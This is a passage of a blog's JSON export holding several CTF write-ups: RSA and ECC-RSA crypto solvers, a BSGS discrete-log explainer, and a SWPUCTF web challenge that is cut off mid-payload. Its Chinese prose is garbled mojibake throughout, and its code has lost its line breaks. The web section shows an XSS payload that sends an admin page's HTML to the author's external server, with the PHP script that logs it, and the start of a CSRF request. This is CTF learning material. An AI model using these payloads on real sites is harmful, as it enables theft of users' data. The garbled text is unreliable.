å€¼å¾—ä¸€æçš„æ˜¯ï¼Œè§£å‡ºçš„æ˜æ–‡ä»¥å¤šé¡¹å¼çš„å½¢å¼ç»™å‡º 1125*y^62 + 111*y^61 + 114*y^60 + 117*y^59 + 53*y^58 + 51*y^57 + 51*y^56 + 100*y^55 + 106*y^54 + 110*y^53 + 102*y^52 + 106*y^51 + 100*y^50 + 104*y^49 + 101*y^48 + 117*y^47 + 52*y^46 + 52*y^45 + 57*y^44 + 48*y^43 + 50*y^42 + 107*y^41 + 35*y^40 + 101*y^39 + 114*y^38 + 117*y^37 + 99*y^36 + 101*y^35 + 115*y^34 + 110*y^33 + 105*y^32 + 95*y^31 + 116*y^30 + 117*y^29 + 98*y^28 + 95*y^27 + 110*y^26 + 117*y^25 + 102*y^24 + 95*y^23 + 115*y^22 + 105*y^21 + 95*y^20 + 97*y^19 + 101*y^18 + 107*y^17 + 105*y^16 + 95*y^15 + 109*y^14 + 111*y^13 + 114*y^12 + 102*y^11 + 95*y^10 + 65*y^9 + 83*y^8 + 82*y^7 + 123*y^6 + 114*y^5 + 118*y^4 + 101*y^3 + 116*y^2 + 97*y + 119 å¹‚ä»£è¡¨ä½æ•°ï¼Œç³»æ•°å³ä¸ºflagçš„å†…å®¹ Code 123456789101112R.&lt;y&gt; = PolynomialRing(GF(43753))n = R(&quot;34036*y^177 + 23068*y^176 + 13147*y^175 + 36344*y^174 + 10045*y^173 + 41049*y^172 + 17786*y^171 + 16601*y^170 + 7929*y^169 + 37570*y^168 + 990*y^167 + 9622*y^166 + 39273*y^165 + 35284*y^164 + 15632*y^163 + 18850*y^162 + 8800*y^161 + 33148*y^160 + 12147*y^159 + 40487*y^158 + 6407*y^157 + 34111*y^156 + 8446*y^155 + 21908*y^154 + 16812*y^153 + 40624*y^152 + 43506*y^151 + 39116*y^150 + 33011*y^149 + 23914*y^148 + 2210*y^147 + 23196*y^146 + 43359*y^145 + 34455*y^144 + 17684*y^143 + 25262*y^142 + 982*y^141 + 24015*y^140 + 27968*y^139 + 37463*y^138 + 10667*y^137 + 39519*y^136 + 31176*y^135 + 27520*y^134 + 32118*y^133 + 8333*y^132 + 38945*y^131 + 34713*y^130 + 1107*y^129 + 43604*y^128 + 4433*y^127 + 18110*y^126 + 17658*y^125 + 32354*y^124 + 3219*y^123 + 40238*y^122 + 10439*y^121 + 3669*y^120 + 8713*y^119 + 21027*y^118 + 29480*y^117 + 5477*y^116 + 24332*y^115 + 43480*y^114 + 33406*y^113 + 43121*y^112 + 1114*y^111 + 17198*y^110 + 22829*y^109 + 24424*y^108 + 16523*y^107 + 20424*y^106 + 36206*y^105 + 41849*y^104 + 3584*y^103 + 26500*y^102 + 31897*y^101 + 34640*y^100 + 27449*y^99 + 30962*y^98 + 41434*y^97 + 22125*y^96 + 24314*y^95 + 3944*y^94 + 18400*y^93 + 38476*y^92 + 28904*y^91 + 27936*y^90 + 41867*y^89 + 25573*y^88 + 25659*y^87 + 33443*y^86 + 18435*y^85 + 5934*y^84 + 38030*y^83 + 17563*y^82 + 24086*y^81 + 36782*y^80 + 20922*y^79 + 38933*y^78 + 23448*y^77 + 10599*y^76 + 7156*y^75 + 29044*y^74 + 23605*y^73 + 7657*y^72 + 28200*y^71 + 2431*y^70 + 3860*y^69 + 23259*y^68 + 14590*y^67 + 33631*y^66 + 15673*y^65 + 36049*y^64 + 29728*y^63 + 22413*y^62 + 18602*y^61 + 18557*y^60 + 23505*y^59 + 17642*y^58 + 12595*y^57 + 17255*y^56 + 15316*y^55 + 8948*y^54 + 38*y^53 + 40329*y^52 + 9823*y^51 + 5798*y^50 + 6379*y^49 + 8662*y^48 + 34640*y^47 + 38321*y^46 + 18760*y^45 + 13135*y^44 + 15926*y^43 + 34952*y^42 + 28940*y^41 + 13558*y^40 + 42579*y^39 + 38015*y^38 + 33788*y^37 + 12381*y^36 + 195*y^35 + 13709*y^34 + 31500*y^33 + 32994*y^32 + 30486*y^31 + 40414*y^30 + 2578*y^29 + 30525*y^28 + 43067*y^27 + 6195*y^26 + 36288*y^25 + 23236*y^24 + 21493*y^23 + 15808*y^22 + 34500*y^21 + 6390*y^20 + 42994*y^19 + 42151*y^18 + 19248*y^17 + 19291*y^16 + 8124*y^15 + 40161*y^14 + 24726*y^13 + 31874*y^12 + 30272*y^11 + 30761*y^10 + 2296*y^9 + 11017*y^8 + 16559*y^7 + 28949*y^6 + 40499*y^5 + 22377*y^4 + 33628*y^3 + 30598*y^2 + 4386*y + 23814&quot;)c = R(&quot;5209*y^176 + 10881*y^175 + 31096*y^174 + 23354*y^173 + 28337*y^172 + 15982*y^171 + 13515*y^170 + 21641*y^169 + 10254*y^168 + 34588*y^167 + 27434*y^166 + 29552*y^165 + 7105*y^164 + 22604*y^163 + 41253*y^162 + 42675*y^161 + 21153*y^160 + 32838*y^159 + 34391*y^158 + 832*y^157 + 720*y^156 + 22883*y^155 + 19236*y^154 + 33772*y^153 + 5020*y^152 + 17943*y^151 + 26967*y^150 + 30847*y^149 + 10306*y^148 + 33966*y^147 + 43255*y^146 + 20342*y^145 + 4474*y^144 + 3490*y^143 + 38033*y^142 + 11224*y^141 + 30565*y^140 + 31967*y^139 + 32382*y^138 + 9759*y^137 + 1030*y^136 + 32122*y^135 + 42614*y^134 + 14280*y^133 + 16533*y^132 + 32676*y^131 + 43070*y^130 + 36009*y^129 + 28497*y^128 + 2940*y^127 + 9747*y^126 + 22758*y^125 + 16615*y^124 + 14086*y^123 + 13038*y^122 + 39603*y^121 + 36260*y^120 + 32502*y^119 + 17619*y^118 + 17700*y^117 + 15083*y^116 + 11311*y^115 + 36496*y^114 + 1300*y^113 + 13601*y^112 + 43425*y^111 + 10376*y^110 + 11551*y^109 + 13684*y^108 + 14955*y^107 + 6661*y^106 + 12674*y^105 + 21534*y^104 + 32132*y^103 + 34135*y^102 + 43684*y^101 + 837*y^100 + 29311*y^99 + 4849*y^98 + 26632*y^97 + 26662*y^96 + 10159*y^95 + 32657*y^94 + 12149*y^93 + 17858*y^92 + 35805*y^91 + 19391*y^90 + 30884*y^89 + 42039*y^88 + 17292*y^87 + 4694*y^86 + 1497*y^85 + 1744*y^84 + 31071*y^83 + 26246*y^82 + 24402*y^81 + 22068*y^80 + 39263*y^79 + 23703*y^78 + 21484*y^77 + 12241*y^76 + 28821*y^75 + 32886*y^74 + 43075*y^73 + 35741*y^72 + 19936*y^71 + 37219*y^70 + 33411*y^69 + 8301*y^68 + 12949*y^67 + 28611*y^66 + 42654*y^65 + 6910*y^64 + 18523*y^63 + 31144*y^62 + 21398*y^61 + 36298*y^60 + 27158*y^59 + 918*y^58 + 38601*y^57 + 4269*y^56 + 5699*y^55 + 36444*y^54 + 34791*y^53 + 37978*y^52 + 32481*y^51 + 8039*y^50 + 11012*y^49 + 11454*y^48 + 30450*y^47 + 1381*y^46 + 32403*y^45 + 8202*y^44 + 8404*y^43 + 37648*y^42 + 43696*y^41 + 34237*y^40 + 36490*y^39 + 41423*y^38 + 35792*y^37 + 36950*y^36 + 31086*y^35 + 38970*y^34 + 12439*y^33 + 7963*y^32 + 16150*y^31 + 11382*y^30 + 3038*y^29 + 20157*y^28 + 23531*y^27 + 32866*y^26 + 5428*y^25 + 21132*y^24 + 13443*y^23 + 28909*y^22 + 42716*y^21 + 6567*y^20 + 24744*y^19 + 8727*y^18 + 14895*y^17 + 28172*y^16 + 30903*y^15 + 26608*y^14 + 27314*y^13 + 42224*y^12 + 42551*y^11 + 37726*y^10 + 11203*y^9 + 36816*y^8 + 5537*y^7 + 20301*y^6 + 17591*y^5 + 41279*y^4 + 7999*y^3 + 33753*y^2 + 34551*y + 9659&quot;)#print(factor(n))import gmpy2f = 43753e = 65537phi = (f**65 - 1)*(f**112 - 1)d = gmpy2.invert(e, phi)m = pow(c, Integer(d), n)for i in range(63): print(chr(m[i]), end=&#x27;&#x27;) [watevrCTF 2019]ECC-RSA 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from fastecdsa.curve import P521 as Curvefrom fastecdsa.point import Pointfrom Crypto.Util.number import bytes_to_long, isPrimefrom os import urandomfrom random import getrandbits def gen_rsa_primes(G): urand = bytes_to_long(urandom(521//8)) while True: s = getrandbits(521) ^ urand Q = s*G if isPrime(Q.x) and isPrime(Q.y): print(&quot;ECC Private key:&quot;, hex(s)) print(&quot;RSA primes:&quot;, hex(Q.x), hex(Q.y)) print(&quot;Modulo:&quot;, hex(Q.x * Q.y)) return (Q.x, Q.y) flag = int.from_bytes(input(), byteorder=&quot;big&quot;) ecc_p = Curve.pa = Curve.ab = Curve.b Gx = Curve.gxGy = Curve.gyG = Point(Gx, Gy, curve=Curve) e = 0x10001p, q = gen_rsa_primes(G)n = p*q file_out = open(&quot;downloads/ecc-rsa.txt&quot;, &quot;w&quot;) file_out.write(&quot;ECC Curve Prime: &quot; + hex(ecc_p) + &quot;\\n&quot;)file_out.write(&quot;Curve a: &quot; + hex(a) + &quot;\\n&quot;)file_out.write(&quot;Curve b: &quot; + hex(b) + &quot;\\n&quot;)file_out.write(&quot;Gx: &quot; + hex(Gx) + &quot;\\n&quot;)file_out.write(&quot;Gy: &quot; + hex(Gy) + &quot;\\n&quot;) file_out.write(&quot;e: &quot; + hex(e) + &quot;\\n&quot;)file_out.write(&quot;p * q: &quot; + hex(n) + &quot;\\n&quot;) c = pow(flag, e, n)file_out.write(&quot;ciphertext: &quot; + hex(c) + &quot;\\n&quot;) ECC y2â‰¡x3+aâˆ—x+bmod ecc_primey^{2} â‰¡ x^{3} + a*x + b \\mod ecc\\_primey2â‰¡x3+aâˆ—x+bmodecc_prime è¿™é‡Œpå¯¹åº”xï¼Œqå¯¹åº”y q2â‰¡p3+aâˆ—p+bmod ecc_primeq^{2} â‰¡ p^{3} + a*p + b \\mod ecc\\_primeq2â‰¡p3+aâˆ—p+bmodecc_prime p2âˆ—q2â‰¡(p3+aâˆ—p+b)âˆ—p2mod ecc_primep^{2} * q^{2} â‰¡ (p^{3} + a*p + b) * p^{2} \\mod ecc\\_primep2âˆ—q2â‰¡(p3+aâˆ—p+b)âˆ—p2modecc_prime n2â‰¡(p3+aâˆ—p+b)âˆ—p2mod ecc_primen^{2} â‰¡ (p^{3} + a*p + b) * p^{2} \\mod ecc\\_primen2â‰¡(p3+aâˆ—p+b)âˆ—p2modecc_prime 0â‰¡(p3+aâˆ—p+b)âˆ—p2âˆ’n2mod ecc_prime0 â‰¡ (p^{3} + a*p + b) * p^{2} - n^{2} \\mod ecc\\_prime0â‰¡(p3+aâˆ—p+b)âˆ—p2âˆ’n2modecc_prime è§£å‡ºpä¹‹åå°±æ˜¯åŸºæ“ Code 123456789101112131415161718192021ep = 0x1ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa = -0x3b = 0x51953eb9618e1c9a1f929a21a0b68540eea2da725b99b315f3b8b489918ef109e156193951ec7e937b1652c0bd3bb1bf073573df883d2c34f1ef451fd46b503f00Gx = 0xc6858e06b70404e9cd9e3ecb662395b4429c648139053fb521f828af606b4d3dbaa14b5e77efe75928fe1dc127a2ffa8de3348b3c1856a429bf97e7e31c2e5bd66Gy = 0x11839296a789a3bc0045c8a5fb42c7d1bd998f54449579b446817afbd17273e662c97ee72995ef42640c550b9013fad0761353c7086a272c24088be94769fd16650e = 0x10001n = 0x118aaa1add80bdd0a1788b375e6b04426c50bb3f9cae0b173b382e3723fc858ce7932fb499cd92f5f675d4a2b05d2c575fc685f6cf08a490d6c6a8a6741e8be4572adfcba233da791ccc0aee033677b72788d57004a776909f6d699a0164af514728431b5aed704b289719f09d591f5c1f9d2ed36a58448a9d57567bd232702e9b28fc = 0x3862c872480bdd067c0c68cfee4527a063166620c97cca4c99baff6eb0cf5d42421b8f8d8300df5f8c7663adb5d21b47c8cb4ca5aab892006d7d44a1c5b5f5242d88c6e325064adf9b969c7dfc52a034495fe67b5424e1678ca4332d59225855b7a9cb42db2b1db95a90ab6834395397e305078c5baff78c4b7252d7966365afed9eimport gmpy2from Crypto.Util.number import *F.&lt;x&gt; = Zmod(ep)[]f = (x**3 + a * x + b)*(x**2) - n**2pset = f.roots()for _ in pset: p = Integer(_[0]) q = n // p phi = (p - 1)*(q - 1) d = gmpy2.invert(gmpy2.mpz(e), gmpy2.mpz(phi)) m = pow(c, d, n) print(long_to_bytes(m))","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://yoloyolo.top/tags/Crypto/"},{"name":"RSA","slug":"RSA","permalink":"https://yoloyolo.top/tags/RSA/"}]},{"title":"ä½¿ç”¨FRPè¿›è¡Œä¸‰å±‚é¶åœºæ¸—é€æµ‹è¯•","slug":"Pentest-With-FRP","date":"2021-01-17T15:28:16.000Z","updated":"2021-01-17T15:31:53.000Z","comments":true,"path":"2021/01/17/Pentest-With-FRP/","link":"","permalink":"https://yoloyolo.top/2021/01/17/Pentest-With-FRP/","excerpt":"","text":"https://shimo.im/docs/DkCc3GKPygyGr6vV","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://yoloyolo.top/tags/Pentest/"}]},{"title":"BSGS","slug":"BSGS","date":"2021-01-16T16:17:37.000Z","updated":"2022-06-27T18:40:39.000Z","comments":true,"path":"2021/01/16/BSGS/","link":"","permalink":"https://yoloyolo.top/2021/01/16/BSGS/","excerpt":"Baby Step Giant Step â€“ å°æ­¥å¤§æ­¥ç®—æ³•","text":"Baby Step Giant Step â€“ å°æ­¥å¤§æ­¥ç®—æ³• ç”¨äºæ±‚è§£å½¢å¦‚ axâ‰¡bmod na^x â‰¡ b \\mod naxâ‰¡bmodn çš„é—®é¢˜(gcd(a,n)=1,x&lt;ngcd(a, n) = 1, x &lt; ngcd(a,n)=1,x&lt;n) å°†xè½¬ä¸º iâˆ—mâˆ’ji*m - jiâˆ—mâˆ’j çš„å½¢å¼ axâ‰¡bmod na^x â‰¡ b \\mod naxâ‰¡bmodn a(iâˆ—mâˆ’j)â‰¡bmod na^{(i*m - j)} â‰¡ b \\mod na(iâˆ—mâˆ’j)â‰¡bmodn a(iâˆ—m)â‰¡bâˆ—ajmod na^{(i*m)} â‰¡ b*a^j \\mod na(iâˆ—m)â‰¡bâˆ—ajmodn å¯¹äºå³è¾¹ï¼Œjéå†[0, m-1]ï¼Œè®¡ç®—ç»“æœè¿›è¡Œå­˜å‚¨ å¯¹äºå·¦è¾¹ï¼Œiéå†[0, nm\\frac{n}{m}mnâ€‹]ï¼Œè®¡ç®—ç»“æœåœ¨å³è¾¹çš„å­˜å‚¨ä¸­è¿›è¡Œæœç´¢ è®¡ç®—æ—¶é—´å¤æ‚åº¦ä¸ºO(nm+m\\frac{n}{m}+mmnâ€‹+m) å½“nm=m\\frac{n}{m} = mmnâ€‹=mæ—¶ å³m=nm = \\sqrt{n}m=nâ€‹æ—¶ è®¡ç®—æ—¶é—´å¤æ‚åº¦æœ€å°ï¼Œä¸ºO(2n2\\sqrt{n}2nâ€‹) ä¾‹å¦‚ï¼š[ç½‘é¼æ¯2020é’é¾™ç»„] you_raise_me_up m, c, nå·²çŸ¥æ¥æ±‚flag 12345678910111213#!/usr/bin/env python# -*- coding: utf-8 -*-from Crypto.Util.number import *import randomn = 2 ** 512m = random.randint(2, n-1) | 1c = pow(m, bytes_to_long(flag), n)print &#x27;m = &#x27; + str(m)print &#x27;c = &#x27; + str(c)# m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075# c = 6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499 sageä¸­å¯ä½¿ç”¨çš„ç¦»æ•£å¯¹æ•°æ±‚è§£å‡½æ•°ï¼š discrete_log discrete_log_rho discrete_log_lambda bsgs ä½†æ˜¯è¿™é‡Œä½¿ç”¨bsgsä¼šç›´æ¥ä½¿pythonæ‰§è¡Œè¿›ç¨‹é€€å‡ºï¼Œåªèƒ½ä½¿ç”¨discrete_log 12345n = 2 ** 512m = 391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075c = 6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499flag = discrete_log(c, mod(m,n))print(long_to_bytes(flag)) è€Œä¹‹å‰çš„digits_missingä¸­åªèƒ½ä½¿ç”¨bsgsï¼Œä½¿ç”¨discrete_logçš„æ•ˆç‡å¤ªä½ 12345678p = 8652390958861741435444627047576503554063739935043923776101303146382894597047179400211376204501335462644199685775560596374016398617315983998885273252232383q = 11398271496284943396462023942239673376393494680988625153067750611899511451472208462647358820098737289431021205366418955146690406049973272066743297095335701n = p * qm = 119734924542618020546820838777476635357941645923563189966789686819064058863592c = 56409941327407928550531590953236316964802997285515886345082618240072551829663483576336544664403443682438280485868042844696756568731554243773790500024504963753053241086872006291605136092928526547169334420024477141471212559780737725850766070778466019859345735742281733141983853509548060639633435609434590536531F = IntegerModRing(n)flag = bsgs(F(m), F(c), (0, 2**32))print(flag) æŸ¥é˜…ç›¸å…³èµ„æ–™ä¹‹åå†ï¼Œå¯¹æ¯”æ¥çœ‹ï¼š bsgsç®—æ³•è™½ç„¶æ—¶é—´å¤æ‚åº¦ä¸ºO(2n2\\sqrt{n}2nâ€‹)ï¼Œä½†æ˜¯å¯ä»¥å€ŸåŠ©å·²çŸ¥æ¡ä»¶æ¥é™å®šflagå€¼çš„èŒƒå›´ï¼Œä»è€Œæå¤§åœ°æé«˜äº†è¯¥å‡½æ•°çš„æ•ˆç‡ è€Œdiscrete_logå‡½æ•°åŸºäºçš„ç®—æ³•ä¸ºï¼šPohlig-Hellman and Baby step giant step. Pohlig-Hellmanç®—æ³•ä¸(n-1)çš„å› æ•°åˆ†è§£ç›¸å…³ï¼Œå¯¹äºæ˜“åˆ†è§£çš„(n-1)ï¼Œä½¿ç”¨è¯¥å‡½æ•°çš„æ•ˆæœæ›´ä½³ å¦å¤–ä¹Ÿæœ‰æ‰©å±•BSGSçš„æƒ…å†µ(gcd(a,n)&gt;1gcd(a, n) &gt; 1gcd(a,n)&gt;1) ç›¸å…³èµ„æ–™ï¼š Sageå®˜æ–¹æ–‡æ¡£ï¼š https://doc.sagemath.org/html/en/reference/groups/sage/groups/generic.html ç¦»æ•£å¯¹æ•°æ±‚è§£ï¼š https://blog.csdn.net/qq_41956187/article/details/104981499 CTFWikiâ€“ç¦»æ•£å¯¹æ•°ï¼š https://ctf-wiki.org/crypto/asymmetric/discrete-log/discrete-log/#pollards-algorithm sageä¹‹ç¦»æ•£å¯¹æ•°æ±‚è§£ï¼š https://blog.csdn.net/ckm1607011/article/details/106849551/ Pollard_Rhoï¼š https://xz.aliyun.com/t/2780?spm=5176.12901015.0.i12901015.10da525cYMMryY BSGSä¸æ‰©å±•BSGSï¼š https://blog.csdn.net/weixin_30701521/article/details/95145298","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://yoloyolo.top/tags/Crypto/"},{"name":"BSGS","slug":"BSGS","permalink":"https://yoloyolo.top/tags/BSGS/"},{"name":"discrete_log","slug":"discrete-log","permalink":"https://yoloyolo.top/tags/discrete-log/"}]},{"title":"çºµæ¨ªæ¯ -- digits_missing","slug":"Crypto-digits-missing","date":"2021-01-15T13:03:36.000Z","updated":"2022-06-27T18:40:16.000Z","comments":true,"path":"2021/01/15/Crypto-digits-missing/","link":"","permalink":"https://yoloyolo.top/2021/01/15/Crypto-digits-missing/","excerpt":"å­¦ï¼","text":"å­¦ï¼ 1234567891011121314151617181920212223242526272829303132333435363738from gmpy2 import *from Crypto.Util.number import *from random import getrandbitsimport uuid flag = &#x27;flag&#123;&#x27; + str(uuid.uuid4()) + &#x27;&#125;&#x27;flag = flag.encode().strip(b&#x27;flag&#123;&#x27;).strip(b&#x27;&#125;&#x27;).split(b&#x27;-&#x27;)padding = long_to_bytes(getrandbits(512)) m = bytes_to_long(flag[0] + padding + b&#x27;&#x27;.join([_ for _ in flag[1:]])) def leak(a, b, c): e1, e2 = a &gt;&gt; 32, a &amp; 2 ** 32 - 1 m1, m2 = b &gt;&gt; 256, b &amp; 2 ** 256 - 1 p, q = getPrime(512), getPrime(512) e = getPrime(32) n = p * q d = invert(e, (p - 1) * (q - 1)) c1 = pow(b, e, n) c2 = pow((m1 + m2), (e1 + e2), n) c3 = pow(a, a, n) c4 = pow(c, 0x10001, n) return (p, q, d % (p-1), d % (q-1), c1, c2, c3, c4) def enc(m): p = getPrime(512) q = getPrime(512) e = 5 n = p * q c = pow(m, e, n) return (c, n) l = leak(bytes_to_long(flag[0]), bytes_to_long(padding), bytes_to_long(flag[1] + flag[2]))c, n = enc(m)print(l)print(n)print(c) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990p = 8652390958861741435444627047576503554063739935043923776101303146382894597047179400211376204501335462644199685775560596374016398617315983998885273252232383q = 11398271496284943396462023942239673376393494680988625153067750611899511451472208462647358820098737289431021205366418955146690406049973272066743297095335701dp = 8227609008398873022400100032341316575069340356351334917468390748158625965488292971381161571649777894379178019250723450517822383161853535988801155974245829dq = 617211540838331845453037224433458963099456992985736058430698238900631773989787292432368601561591831465287703203840756371539826467039309120629989472610731n = 117748526248625603136351142766702204100236020660530366220791523773556022688543102946994917484678907692740314580746055286084348066502206905265752560353316613182375867778005737716910384438378102771898539357644605407585140993539708961209892736485222242671952840176226813623119643604701373240666050114195876590147c = 11808273710504985443774404922628957257282747551484241545715693957153834727214995382868148041169819735282602593341730142167762213843046458242397247585755571045197205530638559439590698610690145211653032525642896154923181980344419031242307181446338164880957117881613097177678720633802107664174510977184795898949c1 = 47136490736007026558241813301582050934441405175571329460613503012332065445341605765747908505286660131226561805265807633529290854688982152443879376327826248561833249864461425952747897175255546352471407983593816589373742238086560879516048675503364687914498582870324744857141831219402137460273880044886984405452c2 = 56409941327407928550531590953236316964802997285515886345082618240072551829663483576336544664403443682438280485868042844696756568731554243773790500024504963753053241086872006291605136092928526547169334420024477141471212559780737725850766070778466019859345735742281733141983853509548060639633435609434590536531c3 = 65058860021739531727088022149052143280404687999094594643616981645096271253997738526846930648540908395636973922952920134720525905860923697049859869913222811090573640409885098897352875692221136178538186740234898374169996494317972403060810936762924806513049343486713829518722226110983873658650785406820898700651c4 = 32982466289233591258768165759927834475634992737248170434422994518702136286193176584067227438086450612500847996564720817106569494236142428184048889837042556370038553603123311299352611462708505050577773451291827498889210800170157619474074829930128950482157454573988753054631832302454833608646278214673705352226 import gmpy2from Crypto.Util.number import * #flag[1]+flag[2]ï¼Œæ ¹æ®p,q,eæ¥ç®—å‡ºdn1 = p * qphi = (p - 1) * (q - 1)d = gmpy2.invert(0x10001, phi)flag12 = pow(c4, d, n1)print(&quot;flag12 : &#123;&#125;&quot;.format(long_to_bytes(flag12))) #paddingï¼Œdp,dqæ±‚mmp = Integer(pow(c1, dp, p))mq = Integer(pow(c1, dq, q))p_ = gmpy2.invert(p, q)padding = ((((mq - mp) * p_) % q) * p + mp) % n1print(&quot;padding : &#123;&#125;&quot;.format(padding)) #flag[0]ï¼Œä¸¤ç§è§£æ³•m1m2 = (padding &gt;&gt; 256) + (padding &amp; 2 ** 256 - 1)charset = &#x27;abcdef0123456789&#x27; ##ä¸­é—´ç›¸é‡ï¼Œå°†åŠ å¯†è¿‡ç¨‹ç†è§£ä¸º((m ** e2) * (m ** e1)) % n1mid = &#123;&#125;for i in charset: for j in charset: for k in charset: for l in charset: e1 = bytes_to_long((i+j+k+l).encode()) e1_ = gmpy2.invert(gmpy2.mpz(pow(m1m2, e1, n1)), n1) tmp = ((c2 * e1_) % n1) mid[tmp] = e1for i in charset: for j in charset: for k in charset: for l in charset: e2 = bytes_to_long((i+j+k+l).encode()) tmp = pow(m1m2, e2, n1) if tmp in mid: e1 = mid[tmp] a = (e1 &lt;&lt; 32) + e2 if pow(a, a, n1) == c3: flag0 = aprint(&quot;flag0 : &#123;&#125;&quot;.format(long_to_bytes(flag0))) ##BSGS(sage)ï¼Œç®—å‡ºe1+e2å†å•ç‹¬çˆ†ç ´e2å³å¯å¾—åˆ°e1F = IntegerModRing(p*q)mm = F(m1m2)c2 = F(c2)e12 = bsgs(mm, c2, (0, 2**32))for i in charset: for j in charset: for k in charset: for l in charset: e2 = bytes_to_long((i+j+k+l).encode()) e1 = (e12 - e2) &lt;&lt; 32 a = e1 + e2 if pow(a,a,n1) == c3: flag0 = aprint(&quot;flag0 : &#123;&#125;&quot;.format(long_to_bytes(flag0))) #flagï¼Œcoppersmith må·²çŸ¥é«˜ä½m_high = bytes_to_long(b&#x27;9aa74d6f&#x27; + long_to_bytes(padding) + b&#x27;bb6b431b&#x27;)e = 5F.&lt;x&gt; = PolynomialRing(Zmod(n))f = (m_high * (2**128) + x) ** e - croots = f.small_roots(epsilon=1/25)[0]m = long_to_bytes(m_high * (2**128) + roots)print(b&#x27;flag&#123;&#x27; + m[:8] + b&#x27;-&#x27; + m[-24:-20] + b&#x27;-&#x27; + m[-20:-16] + b&#x27;-&#x27; + m[-16:-12] + b&#x27;-&#x27; + m[-12:] + b&#x27;&#125;&#x27;)######kbits = 14 * 8for i in charset: for j in charset: tmp = bytes_to_long(b&#x27;9aa74d6f&#x27; + long_to_bytes(padding) + b&#x27;bb6b431b&#x27; + i.encode() + j.encode()) f = (tmp * (2**kbits) + x) ** e - c roots = f.small_roots(X=2**kbits, beta=1) if roots: x0 = roots[0] m = long_to_bytes(tmp * (2**kbits) + x0) print(b&#x27;flag&#123;&#x27; + m[:8] + b&#x27;-&#x27; + m[-24:-20] + b&#x27;-&#x27; + m[-20:-16] + b&#x27;-&#x27; + m[-16:-12] + b&#x27;-&#x27; + m[-12:] + b&#x27;&#125;&#x27;) æœ€åcoppersmithéƒ¨åˆ†çš„æ±‚æ ¹ä»£ç è¿˜æ²¡æœ‰å®Œå…¨ç†è§£ ç¬¬ä¸€ç§æ–¹æ³•æ˜¯ç›´æ¥è®¾ç½®å‚æ•°epsilonå°±å¯ä»¥ç›´æ¥æ±‚è§£ ç¬¬äºŒç§æ–¹æ³•è®¾ç½®betaï¼Œä½†æ˜¯éœ€è¦å†çˆ†ç ´ä¸¤ä½æ˜æ–‡","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://yoloyolo.top/tags/Crypto/"},{"name":"RSA","slug":"RSA","permalink":"https://yoloyolo.top/tags/RSA/"},{"name":"Coppersmith","slug":"Coppersmith","permalink":"https://yoloyolo.top/tags/Coppersmith/"}]},{"title":"SWPUCTF -- Web3","slug":"SWPUCTF-Web3","date":"2021-01-14T13:25:50.000Z","updated":"2022-06-14T12:20:46.000Z","comments":true,"path":"2021/01/14/SWPUCTF-Web3/","link":"","permalink":"https://yoloyolo.top/2021/01/14/SWPUCTF-Web3/","excerpt":"å¯¹ç€WriteUpå¤ç›˜è¿˜æ˜¯é‡åˆ°äº†ä¸å°‘é—®é¢˜ï¼Œä¹Ÿå­¦åˆ°äº†å¾ˆå¤šTrick","text":"å¯¹ç€WriteUpå¤ç›˜è¿˜æ˜¯é‡åˆ°äº†ä¸å°‘é—®é¢˜ï¼Œä¹Ÿå­¦åˆ°äº†å¾ˆå¤šTrick XSS æ³¨å†Œç”¨æˆ·åå¤„å¯ä»¥æ„é€ XSSï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªXSSæ¥å¼•ç”¨å¤–éƒ¨çš„jsæ–‡ä»¶ 1&lt;script src=https://yoloyolo.top/1.js&gt;&lt;/script&gt; Payload1å¦‚ä¸‹ 12345//Payload1 For XSSvar source = document.documentElement.outerHTML;txt = escape(source);var newimg = new Image();newimg.src=&quot;https://yoloyolo.top/1.php?key=&quot;+&quot;\\n&quot;+txt+&quot;\\n&quot;; 1234&lt;?php$file = &quot;new&quot;;file_put_contents($file,$_REQUEST[&#x27;key&#x27;],FILE_APPEND);?&gt; ç”±äºè¿™é‡Œè¢«è®¾ç½®äº†HTTPOnlyï¼Œä¸èƒ½ä½¿ç”¨XSSæ¥ç›—å–Cookieï¼Œåªèƒ½å…ˆè·å–adminåå°é¡µé¢çš„å†…å®¹ æ ¹æ®å†…å®¹å†è¿›è¡Œåç»­çš„æ“ä½œ è¿”å›çš„HTMLæºç ä¸­å¯ä»¥çœ‹åˆ°ä»¥ä¸‹å†…å®¹ 1&lt;form action=&quot;./ssrf_for_test.php&quot; method=&quot;GET&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;url&quot; placeholder=&quot;Input url...&quot;&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;%u83B7%u53D6%u8D44%u6E90&quot;&gt;&lt;/form&gt; æ™®é€šç”¨æˆ·å»è®¿é—®./ssrf_for_test.phpåˆ™ä¼šæç¤ºæƒé™ä¸è¶³ ä½†æ˜¯å¯ä»¥ä½¿ç”¨XSSæ¥è¿›ä¸€æ­¥æ„é€ CSRFï¼Œå»è¯»å–phpçš„æ˜¾ç¤ºå†…å®¹ CSRF è¿™é‡Œæˆ‘ä»¬ç›´æ¥æ›´æ”¹1.jsçš„å†…å®¹ 123456//Payload2 For XSS+CSRFvar httpreq1 = new XMLHttpRequest();httpreq1.open(&#x27;GET&#x27;,&#x27;http://192.168.56.103:40090/ssrf_for_test.php&#x27;,false);httpreq1.send();var img = new Image();img.src = 